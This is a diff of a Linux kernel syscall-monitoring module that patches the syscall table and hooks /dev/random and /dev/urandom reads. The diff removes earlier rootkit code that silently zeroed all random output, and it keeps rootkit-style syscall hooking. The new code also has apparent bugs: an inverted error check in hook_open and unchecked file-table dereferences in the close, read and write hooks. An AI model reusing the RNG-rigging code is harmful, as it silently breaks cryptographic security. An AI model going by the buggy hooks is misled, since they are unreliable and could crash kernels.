@@ -10,6 +10,11 @@
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 
+#include <linux/sched.h>
+#include <linux/fdtable.h>
+#include <linux/path.h>
+#include <linux/dcache.h>
+
 #include "syscall_hooks.h"
 #include "ftrace_helper.h"
 
@@ -28,12 +33,12 @@ static unsigned long * __sys_call_table;
 syscall_t orig_mkdir;
 asmlinkage int hook_mkdir(const struct pt_regs *regs)
 {
-    char __user *pathname = (char *)regs->di;
+    const char __user *pathname = (char *)regs->di;
+    umode_t mode = (umode_t)regs->si;
+
     char dir_name[NAME_MAX] = {0};
 
-    /* Copy the directory name from userspace (pathname, from
-     * the pt_regs struct, to kernelspace (dir_name) so that we
-     * can print it out to the kernel buffer */
+    /* копировать имя директории из пр-ва пользователя в пр-во ядра */
     long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
     if (error > 0)
@@ -58,10 +63,9 @@ asmlinkage int hook_open(const struct pt_regs *regs)
 
     int fd = orig_open(regs);
         
-    // if (error > 0)
-    //     printk(KERN_INFO KERNEL_MONITOR "Process %d; open: %s, flags: %x; mode: %x; fd: \n", current->pid, kernel_filename, flags, mode, fd);
-    // else
-    //     printk(KERN_INFO KERNEL_MONITOR "Process %d; open: x, flags: %x; mode: %x; fd: \n", current->pid, flags, mode, fd);
+    if (!error && current->real_parent->pid > 3)
+         printk(KERN_INFO KERNEL_MONITOR "Process %d; open: %s, flags: %x; mode: %x; fd: %d\n", current->pid, kernel_filename, flags, mode, fd);
+
     return fd;
 }
 
@@ -69,9 +73,16 @@ syscall_t orig_close;
 asmlinkage int hook_close(const struct pt_regs *regs)
 {
     unsigned int fd = (unsigned int)regs->di;
+
     /* Не логировать закрытие stdin, stdout, stderr */
-    if (fd > 2)
-        printk(KERN_INFO KERNEL_MONITOR "Process %d; close %d\n", current->pid, fd);
+    if (fd > 2 && current->real_parent->pid > 3)
+    {
+        /* Open file information: */
+        // current->files
+
+        printk(KERN_INFO KERNEL_MONITOR "Process %d; close fd: %d; filename: %s\n", current->pid, fd, 
+            current->files->fdt->fd[fd]->f_path.dentry->d_iname);
+    }
     return orig_close(regs);
 }
 
@@ -79,10 +90,13 @@ syscall_t orig_read;
 asmlinkage int hook_read(const struct pt_regs *regs)
 {
     unsigned int fd = (unsigned int)regs->di;
+    char __user *buf = (char*)regs->si;
+    size_t count = (size_t)regs->dx;
 
     /* Не логировать стандартный ввод/вывод, а так же системные процессы */
     if (fd > 2 && current->real_parent->pid > 3)
-        printk(KERN_INFO KERNEL_MONITOR "Process %d; read %d\n", current->pid, fd);
+        printk(KERN_INFO KERNEL_MONITOR "Process %d; read fd: %d; buf: %p; count: %ld; filename: %s\n", current->pid, fd, buf, count,
+            current->files->fdt->fd[fd]->f_path.dentry->d_iname);
     return orig_read(regs);
 }
 
@@ -90,10 +104,13 @@ syscall_t orig_write;
 asmlinkage int hook_write(const struct pt_regs *regs)
 {
     unsigned int fd = (unsigned int)regs->di;
+    const char __user *buf = (const char*)regs->si;
+    size_t count = (size_t)regs->dx;
 
     /* Не логировать стандартный ввод/вывод, а так же системные процессы */
     if (fd > 2 && current->real_parent->pid > 3)
-        printk(KERN_INFO KERNEL_MONITOR "Process %d; write %d\n", current->pid, fd);
+        printk(KERN_INFO KERNEL_MONITOR "Process %d; write fd: %d; buf: %p; count: %ld; filename: %s\n", current->pid, fd, buf, count,
+            current->files->fdt->fd[fd]->f_path.dentry->d_iname);
     return orig_write(regs);
 }
 
@@ -103,84 +120,23 @@ int bdev_write_page(struct block_device *bdev, sector_t sector, struct page *pag
 static ssize_t random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
 */
 
-/* Function pointer declarations for the real random_read() and urandom_read() */
 static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
-static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
-
-/* Hook functions for random_read() and urandom_read() */
 static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
 {
-    int bytes_read, i;
-    long error;
-    char *kbuf = NULL;
-
-    /* Call the real random_read() file operation to set up all the structures */
+    /* Вызов оригинального random_read() */
+    int bytes_read;
     bytes_read = orig_random_read(file, buf, nbytes, ppos);
-    // printk(KERN_DEBUG "rootkit: intercepted read to /dev/random: %d bytes\n", bytes_read);
-
-    /* Allocate a kernel buffer that we will copy the random bytes into
-     * Note that copy_from_user() returns the number of bytes that could NOT be copied
-     */
-    kbuf = kzalloc(bytes_read, GFP_KERNEL);
-    error = copy_from_user(kbuf, buf, bytes_read);
-
-    if(error)
-    {
-        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
-        kfree(kbuf);
-        return bytes_read;
-    }
-
-    /* Fill kbuf with 0x00 */
-    for ( i = 0 ; i < bytes_read ; i++ )
-        kbuf[i] = 0x00;
-
-    /* Copy the rigged kbuf back to userspace
-     * Note that copy_to_user() returns the number of bytes that could NOT be copied
-     */
-    error = copy_to_user(buf, kbuf, bytes_read);
-    if (error)
-        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);
-
-    kfree(kbuf);
+    printk(KERN_INFO KERNEL_MONITOR "Process %d read %d bytes from /dev/random\n", current->pid, bytes_read);
     return bytes_read;
 }
 
+static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
 static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
 {
-    int bytes_read, i;
-    long error;
-    char *kbuf = NULL;
-
-    /* Call the real urandom_read() file operation to set up all the structures */
+    /* Вызов оригинального urandom_read() */
+    int bytes_read;
     bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
-    // printk(KERN_DEBUG "rootkit: intercepted call to /dev/urandom: %d bytes", bytes_read);
-
-    /* Allocate a kernel buffer that we will copy the random bytes into.
-     * Note that copy_from_user() returns the number of bytes the could NOT be copied
-     */
-    kbuf = kzalloc(bytes_read, GFP_KERNEL);
-    error = copy_from_user(kbuf, buf, bytes_read);
-
-    if(error)
-    {
-        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
-        kfree(kbuf);
-        return bytes_read;
-    }
-
-    /* Fill kbuf with 0x00 */
-    for ( i = 0 ; i < bytes_read ; i++ )
-        kbuf[i] = 0x00;
-
-    /* Copy the rigged kbuf back to userspace
-     * Note that copy_to_user() returns the number of bytes that could NOT be copied
-     */
-    error = copy_to_user(buf, kbuf, bytes_read);
-    if (error)
-        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);
-
-    kfree(kbuf);
+    printk(KERN_INFO KERNEL_MONITOR "Process %d read %d bytes from /dev/urandom\n", current->pid, bytes_read);    
     return bytes_read;
 }
 
@@ -190,7 +146,7 @@ static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf,
  * */
 static struct ftrace_hook hooks[] = 
 {
-	HOOK("random_read", hook_random_read, &orig_random_read),
+    HOOK("random_read", hook_random_read, &orig_random_read),
     HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
 };
 
@@ -234,9 +190,9 @@ static int __init kernel_monitor_init(void)
     __sys_call_table[__NR_mkdir]    = (unsigned long)hook_mkdir;
 
     __sys_call_table[__NR_open]     = (unsigned long)hook_open;
-    // __sys_call_table[__NR_close]    = (unsigned long)hook_close;
-    // __sys_call_table[__NR_read]     = (unsigned long)hook_read;
-    // __sys_call_table[__NR_write]    = (unsigned long)hook_write;
+    __sys_call_table[__NR_close]    = (unsigned long)hook_close;
+    __sys_call_table[__NR_read]     = (unsigned long)hook_read;
+    __sys_call_table[__NR_write]    = (unsigned long)hook_write;
 
     /* Восстановить защиту от записи */
     protect_memory();
